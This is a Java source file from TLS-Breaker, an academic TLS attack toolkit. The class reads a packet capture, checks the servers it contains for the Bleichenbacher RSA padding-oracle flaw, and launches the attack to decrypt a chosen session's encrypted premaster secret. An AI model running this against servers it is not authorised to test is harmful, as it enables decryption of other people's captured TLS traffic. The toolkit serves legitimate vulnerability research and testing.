/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.bleichenbacher.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import static org.apache.commons.lang3.StringUtils.trim;

import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import org.apache.commons.codec.binary.Hex;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsbreaker.bleichenbacher.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsbreaker.breakercommons.attacker.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.attacker.PcapFileHandler;
import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ConsoleInteractor;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ServerSelection;

public class BleichenbacherPcapFileHandler implements PcapFileHandler {

    private static final Logger LOGGER = LogManager.getLogger();
    BleichenbacherCommandConfig bleichenbacherCommandConfig;
    ConsoleInteractor consoleInteractor;

    public BleichenbacherPcapFileHandler(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        this.bleichenbacherCommandConfig = bleichenbacherCommandConfig;
        this.consoleInteractor = new ConsoleInteractor();
    }

    public void handlePcapFile() {
        PcapAnalyzer pcapAnalyzer = new PcapAnalyzer(bleichenbacherCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (!sessions.isEmpty()) {
            ServerSelection bleichenbacherServerSelection = new BleichenbacherServerSelection(sessions);
            Map<String, List<PcapSession>> serverSessionsMap = bleichenbacherServerSelection.getServerSessionsMap();
            List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
            if (!uniqueServers.isEmpty()) {
                if (isConnectParameterGiven()) {
                    processServerOverride(uniqueServers, serverSessionsMap);
                } else {
                    processPcapServers(uniqueServers, serverSessionsMap);
                }
            } else {
                CONSOLE.info("\nFound no potential servers for Bleichenbacher attack.");
            }
        } else {
            CONSOLE.info("No TLS handshake message found.");
        }
    }

    private void processServerOverride(List<String> uniqueServers, Map<String, List<PcapSession>> serverSessionsMap) {
        String overridingHost = bleichenbacherCommandConfig.getClientDelegate().getHost();
        Attacker<? extends TLSDelegateConfig> attacker =
            new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        Boolean result = attacker.checkVulnerability().asBool();
        if (Objects.equals(result, Boolean.TRUE)) {
            CONSOLE.info("Vulnerable:" + result.toString());
            CONSOLE.info("Server " + overridingHost + " is vulnerable");
            List<PcapSession> vulnerablePcapSessions =
                getVulnerableSessions(uniqueServers, serverSessionsMap, attacker);
            if (!vulnerablePcapSessions.isEmpty()) {
                consoleInteractor.displayServerAndSessionDetails(vulnerablePcapSessions);
                PcapSession selectedSession = consoleInteractor.getUserSelectedSession(vulnerablePcapSessions);
                if (selectedSession != null) {
                    executeAttack(selectedSession, overridingHost, bleichenbacherCommandConfig);
                }
            } else {
                CONSOLE.info("Encrypted PMS cannot be fetched. No server from the pcap file has the same public as "
                    + overridingHost);
            }

        } else if (Objects.equals(result, Boolean.FALSE)) {
            CONSOLE.info("Vulnerable:" + result.toString());
        } else {
            CONSOLE.warn("Vulnerable: Uncertain");
        }
    }

    private List<PcapSession> getVulnerableSessions(List<String> uniqueServers,
        Map<String, List<PcapSession>> serverSessionsMap, Attacker<? extends TLSDelegateConfig> attacker) {
        List<PcapSession> pcapSessions = new ArrayList<>();
        RSAPublicKey publicKey = getPublicKey(attacker);
        List<String> servers = getServersWithSamePublicKey(publicKey, uniqueServers, attacker);
        for (String server : servers) {
            pcapSessions.addAll(serverSessionsMap.get(server));
        }
        return pcapSessions;
    }

    private List<String> getServersWithSamePublicKey(RSAPublicKey publicKey, List<String> uniqueServers,
        Attacker<? extends TLSDelegateConfig> attacker) {
        List<String> servers = new ArrayList<>();
        for (String server : uniqueServers) {
            bleichenbacherCommandConfig.getClientDelegate().setHost(server);
            RSAPublicKey publicKeyOfPcapServer = null;
            try {
                publicKeyOfPcapServer = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(attacker.getTlsConfig());
            } catch (Exception e) {
                LOGGER.warn("Public key could not be fetched for the server " + server);
            }
            if (publicKey.equals(publicKeyOfPcapServer)) {
                servers.add(server);
            }
        }
        return servers;
    }

    private RSAPublicKey getPublicKey(Attacker<? extends TLSDelegateConfig> attacker) {
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(attacker.getTlsConfig());
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);
        return publicKey;
    }

    private void processPcapServers(List<String> uniqueServers, Map<String, List<PcapSession>> serverSessionsMap) {
        CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
        // ConsoleInteractor consoleInteractor = new ConsoleInteractor();
        consoleInteractor.displayServerAndSessionCount(uniqueServers, serverSessionsMap);
        String userOption = consoleInteractor.getValidUserSelection(uniqueServers);
        if ("N".equals(userOption)) {
            CONSOLE.info("Execution of the attack cancelled.");
        } else if ("a".equals(userOption)) {
            checkVulnerabilityOfAllServersAndDisplay(uniqueServers, bleichenbacherCommandConfig, serverSessionsMap,
                consoleInteractor);
        } else if (isCommaSeparatedList(userOption)) {
            List<String> hosts = new ArrayList<>();
            Arrays.stream(userOption.split(","))
                .forEach(serverNumber -> hosts.add(uniqueServers.get(Integer.parseInt(trim(serverNumber)) - 1)));

            checkVulnerabilityOfAllServersAndDisplay(hosts, bleichenbacherCommandConfig, serverSessionsMap,
                consoleInteractor);
        } else {
            String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
            LOGGER.info("Selected server: " + host);
            bleichenbacherCommandConfig.getClientDelegate().setHost(host);
            Boolean vulnerability = checkVulnerability(bleichenbacherCommandConfig);
            if (Objects.equals(vulnerability, Boolean.TRUE)) {
                CONSOLE.info("Server " + host + " is vulnerable.");
                selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
            } else {
                CONSOLE.info("The server " + host + " is not vulnerable.");
            }
        }
    }

    private boolean isConnectParameterGiven() {
        return !StringUtils.isEmpty(bleichenbacherCommandConfig.getClientDelegate().getHost());
    }

    private void checkVulnerabilityOfAllServersAndDisplay(List<String> uniqueServers,
        BleichenbacherCommandConfig bleichenbacherCommandConfig, Map<String, List<PcapSession>> serverSessionsMap,
        ConsoleInteractor consoleInteractor) {
        List<String> vulnerableServers = getVulnerableServers(uniqueServers, bleichenbacherCommandConfig);
        CONSOLE.info("Found " + vulnerableServers.size() + "  vulnerable server.");
        if (!vulnerableServers.isEmpty()) {
            consoleInteractor.displayServerAndSessionCount(vulnerableServers, serverSessionsMap);
        }
        if (vulnerableServers.size() == 1) {
            String host = vulnerableServers.get(0);
            CONSOLE.info("Session details of " + host + " server:");
            selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
        } else if (vulnerableServers.size() > 1) {
            CONSOLE.info("Please select a server to view session details.");
            CONSOLE.info("server number: ");
            int serverNumber = consoleInteractor.getUserSelectedServer(uniqueServers);
            String host = uniqueServers.get(serverNumber - 1);
            selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
        }

    }

    private List<String> getVulnerableServers(List<String> uniqueServers,
        BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        List<String> vulnerableServers = new ArrayList<>();
        for (String server : uniqueServers) {
            bleichenbacherCommandConfig.getClientDelegate().setHost(server);

            Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());

            try {
                Boolean result = attacker.checkVulnerability().asBool();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                    vulnerableServers.add(server);
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
        return vulnerableServers;
    }

    private void selectSessionAndExecuteAttack(Map<String, List<PcapSession>> serverSessionsMap, String host,
        BleichenbacherCommandConfig bleichenbacherCommandConfig, ConsoleInteractor consoleInteractor) {
        List<PcapSession> hostSessions = serverSessionsMap.get(host);
        consoleInteractor.displaySessionDetails(hostSessions);
        PcapSession selectedSession = consoleInteractor.getUserSelectedSession(hostSessions);
        if (selectedSession != null) {
            executeAttack(selectedSession, selectedSession.getDestinationHost(), bleichenbacherCommandConfig);
        }
    }

    private void executeAttack(PcapSession session, String host,
        BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        bleichenbacherCommandConfig.getClientDelegate().setHost(host);
        bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
        LOGGER.info("host=" + bleichenbacherCommandConfig.getClientDelegate().getHost()
            + " and encryptedPremasterSecret=" + bleichenbacherCommandConfig.getEncryptedPremasterSecret());

        Attacker<? extends TLSDelegateConfig> attacker =
            new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        attacker.attack();
    }

    private String getPreMasterSecret(PcapSession session) {
        String preMasterSecret = null;
        byte[] pms = session.getPreMasterSecret();
        preMasterSecret = new String(Hex.encodeHex(pms));
        return preMasterSecret;
    }

    private boolean isCommaSeparatedList(String userOption) {
        return userOption.contains(",");
    }

    private Boolean checkVulnerability(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
            new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        Boolean result = null;
        try {
            result = attacker.checkVulnerability().asBool();
            if (Objects.equals(result, Boolean.TRUE)) {
                CONSOLE.error("Vulnerable:" + result.toString());
            } else if (Objects.equals(result, Boolean.FALSE)) {
                CONSOLE.info("Vulnerable:" + result.toString());
            } else {
                CONSOLE.warn("Vulnerable: Uncertain");
            }
        } catch (UnsupportedOperationException e) {
            LOGGER.info("The selected attacker is currently not implemented");
        }
        return result;
    }
}
